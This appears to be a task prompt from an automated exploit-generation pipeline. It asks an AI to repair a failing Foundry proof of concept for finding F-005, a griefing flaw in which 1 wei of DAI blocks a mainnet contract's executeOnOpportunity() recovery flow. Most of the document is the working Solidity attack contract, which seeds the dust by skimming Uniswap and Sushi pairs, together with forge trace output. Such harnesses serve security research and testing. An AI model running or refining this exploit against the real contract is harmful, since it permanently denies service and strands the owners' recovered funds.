You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: A single wei of DAI can brick every future recovery attempt
- claim: `executeOnOpportunity()` unconditionally tries to liquidate any positive DAI balance. Because Uniswap V2 rounds sufficiently tiny swaps down to zero output, an attacker can transfer 1 wei of DAI to the contract and force `_swapTokenToEth(DAI)` to revert when the router attempts to swap that balance, causing the entire `executeOnOpportunity()` transaction to revert on every run until additional DAI is donated.
- impact: Any external account can cheaply and permissionlessly deny service to the recovery flow, blocking liquidation of legitimately recovered WBTC/USDC/USDT/WETH proceeds as well. Since the contract has no token rescue or dust-clearing path, the griefing balance can persist indefinitely and strand future recoveries.
- exploit_paths: ["An attacker transfers 1 wei of DAI to `FlawVerifier`", "A caller invokes `executeOnOpportunity()`", "`_swapTokenToEth(DAI)` observes `bal > 0` and calls the Uniswap V2 router with `amountIn = 1`", "The swap computes zero ETH output for that tiny amount and reverts, bubbling the failure up", "The whole transaction reverts, so no bounty sweep or liquidation can complete until more DAI is added"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function skim(address to) external;
}

interface IOpportunityTarget {
    function executeOnOpportunity() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    error NoDonationDust();
    error DonationFailed();
    error HypothesisRefuted();
    error TargetDidNotRetainDust();

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _hypothesisValidated = false;

        uint256 targetDaiBefore = IERC20(DAI).balanceOf(TARGET);

        if (targetDaiBefore == 0) {
            _seedTargetWithDaiDust();
            targetDaiBefore = IERC20(DAI).balanceOf(TARGET);
            if (targetDaiBefore == 0) {
                revert NoDonationDust();
            }
        }

        (bool ok,) = TARGET.call(abi.encodeWithSelector(IOpportunityTarget.executeOnOpportunity.selector));
        if (ok) {
            revert HypothesisRefuted();
        }

        uint256 targetDaiAfter = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiAfter == 0 || targetDaiAfter < targetDaiBefore) {
            revert TargetDidNotRetainDust();
        }

        _hypothesisValidated = true;
        _profitAmount = 0;
    }

    function profitToken() external pure returns (address) {
        return DAI;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "ensure target has positive DAI dust -> call TARGET.executeOnOpportunity() -> ",
                "victim _swapTokenToEth(DAI) sees bal > 0 -> victim router swap uses tiny amountIn -> ",
                "tiny Uniswap V2 swap returns zero ETH output and reverts -> full transaction reverts"
            )
        );
    }

    function _seedTargetWithDaiDust() internal {
        if (_trySafeTransfer(DAI, TARGET, 1)) {
            return;
        }

        if (_trySafeTransferFrom(DAI, msg.sender, TARGET, 1)) {
            return;
        }

        if (tx.origin != msg.sender && _trySafeTransferFrom(DAI, tx.origin, TARGET, 1)) {
            return;
        }

        _skimDaiPairsToTarget(UNI_FACTORY);
        if (IERC20(DAI).balanceOf(TARGET) > 0) {
            return;
        }

        _skimDaiPairsToTarget(SUSHI_FACTORY);
        if (IERC20(DAI).balanceOf(TARGET) > 0) {
            return;
        }

        if (_trySafeTransfer(DAI, TARGET, 1)) {
            return;
        }

        revert DonationFailed();
    }

    function _skimDaiPairsToTarget(address factory) internal {
        address[26] memory counterparts = [
            WETH,
            WBTC,
            USDC,
            USDT,
            0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2,
            0x514910771AF9Ca656af840dff83E8264EcF986CA,
            0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984,
            0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9,
            0xD533a949740bb3306d119CC777fa900bA034cd52,
            0xc00e94Cb662C3520282E6f5717214004A7f26888,
            0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F,
            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
            0x111111111117dC0aa78b770fA6A738034120C302,
            0x0D8775F648430679A709E98d2b0Cb6250d2887EF,
            0xE41d2489571d322189246DaFA5ebDe1F4699F498,
            0x0F5D2fB29fb7d3CFeE444a200298f468908cC942,
            0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c,
            0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32,
            0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72,
            0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE,
            0x6982508145454Ce325dDbE47a25d4ec3d2311933,
            0x853d955aCEf822Db058eb8505911ED77F175b99e,
            0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0,
            0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D,
            0xba100000625a3754423978a60c9317c58a424e3D
        ];

        for (uint256 i = 0; i < counterparts.length; ++i) {
            address pair = IUniswapV2Factory(factory).getPair(DAI, counterparts[i]);
            if (pair == address(0)) {
                continue;
            }

            (bool ok,) = pair.call(abi.encodeWithSelector(IUniswapV2Pair.skim.selector, TARGET));
            ok;

            if (IERC20(DAI).balanceOf(TARGET) > 0) {
                return;
            }
        }
    }

    function _trySafeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        if (IERC20(token).balanceOf(address(this)) < amount) {
            return false;
        }

        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _trySafeTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount)
        );
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE) [staticcall]
    │   │   └─ ← [Return] 0xb011EA8096cE5986f3e89B4C2c02f193c82AbEa8
    │   ├─ [27309] 0xb011EA8096cE5986f3e89B4C2c02f193c82AbEa8::skim(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe)
    │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xb011EA8096cE5986f3e89B4C2c02f193c82AbEa8) [staticcall]
    │   │   │   └─ ← [Return] 1703196050961258295 [1.703e18]
    │   │   ├─ [3474] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe, 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000b011ea8096ce5986f3e89b4c2c02f193c82abea8
    │   │   │   │        topic 2: 0x000000000000000000000000f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2639] 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE::balanceOf(0xb011EA8096cE5986f3e89B4C2c02f193c82AbEa8) [staticcall]
    │   │   │   └─ ← [Return] 121686420558260500662202 [1.216e23]
    │   │   ├─ [3527] 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE::transfer(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe, 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000b011ea8096ce5986f3e89b4c2c02f193c82abea8
    │   │   │   │        topic 2: 0x000000000000000000000000f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x6982508145454Ce325dDbE47a25d4ec3d2311933) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0xE0D4BedEbD73cA5848BDf2C2eE5345650C2112f5
    │   ├─ [27332] 0xE0D4BedEbD73cA5848BDf2C2eE5345650C2112f5::skim(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe)
    │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xE0D4BedEbD73cA5848BDf2C2eE5345650C2112f5) [staticcall]
    │   │   │   └─ ← [Return] 814448640319041993 [8.144e17]
    │   │   ├─ [3474] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe, 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000e0d4bedebd73ca5848bdf2c2ee5345650c2112f5
    │   │   │   │        topic 2: 0x000000000000000000000000f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xE0D4BedEbD73cA5848BDf2C2eE5345650C2112f5) [staticcall]
    │   │   │   └─ ← [Return] 897058081952207164 [8.97e17]
    │   │   ├─ [3523] 0x853d955aCEf822Db058eb8505911ED77F175b99e::transfer(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe, 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000e0d4bedebd73ca5848bdf2c2ee5345650c2112f5
    │   │   │   │        topic 2: 0x000000000000000000000000f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0xba100000625a3754423978a60c9317c58a424e3D) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] DonationFailed()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x6929abD7931D0243777d3CD147fE863646A752ba.skim
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 29.26s (29.14s CPU time)

Ran 1 test suite in 29.36s (29.26s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 1495700)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
